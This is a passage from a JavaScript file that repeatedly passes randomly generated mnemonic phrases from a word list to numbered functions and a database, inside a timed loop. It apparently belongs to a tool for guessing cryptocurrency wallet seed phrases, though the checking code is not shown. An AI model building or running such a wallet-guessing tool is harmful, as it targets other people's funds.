      s202(getRandomMnemonic(wordsArray), db);
      s203(getRandomMnemonic(wordsArray), db);
      s204(getRandomMnemonic(wordsArray), db);
      s205(getRandomMnemonic(wordsArray), db);
      s206(getRandomMnemonic(wordsArray), db);
      s207(getRandomMnemonic(wordsArray), db);
      s208(getRandomMnemonic(wordsArray), db);
      s209(getRandomMnemonic(wordsArray), db);
      s210(getRandomMnemonic(wordsArray), db);
      s211(getRandomMnemonic(wordsArray), db);
      s212(getRandomMnemonic(wordsArray), db);
      s213(getRandomMnemonic(wordsArray), db);
      s214(getRandomMnemonic(wordsArray), db);
      s215(getRandomMnemonic(wordsArray), db);
      s216(getRandomMnemonic(wordsArray), db);
      s217(getRandomMnemonic(wordsArray), db);
      s218(getRandomMnemonic(wordsArray), db);
      s219(getRandomMnemonic(wordsArray), db);


    }, timeout);
    timeout += 1000;
  } catch (error) {
    console.error("Error generating mnemonic:", error);
  }
}
}
